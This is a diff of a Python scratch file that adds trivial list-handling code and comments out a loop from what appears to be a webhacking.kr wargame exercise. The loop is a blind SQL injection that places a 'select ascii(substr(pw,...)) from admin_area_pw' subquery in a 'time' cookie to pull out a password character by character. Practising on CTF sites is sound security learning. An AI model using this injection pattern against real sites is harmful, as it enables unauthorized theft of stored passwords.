@@ -2,10 +2,16 @@ import requests
 import random
 
 a = [1,2,3]
-for i in range(3,3):
-    print(i)
 
-print(a.index(3))
+def test(arr):
+    arr[0] = 3
+
+test(a)
+print(a)
+
+if 2 in a:
+    print('hi')
+
 # a = "abcde\n"
 # print(a[:-1])
 
@@ -24,8 +30,8 @@ print(a.index(3))
 
 # f.close()
 
-for i in range(1,17+1):    
-    query = '(select ascii(substr(pw,'+str(i)+',1)) from admin_area_pw)'
-    cookies = {'session_id': '9duomlvvtajucp5p48gv53lm5d', 'time':query}
-    res = requests.get('https://webhacking.kr/challenge/web-02/', cookies=cookies)
-    print(res.text)
+# for i in range(1,17+1):    
+#     query = '(select ascii(substr(pw,'+str(i)+',1)) from admin_area_pw)'
+#     cookies = {'session_id': '9duomlvvtajucp5p48gv53lm5d', 'time':query}
+#     res = requests.get('https://webhacking.kr/challenge/web-02/', cookies=cookies)
+#     print(res.text)
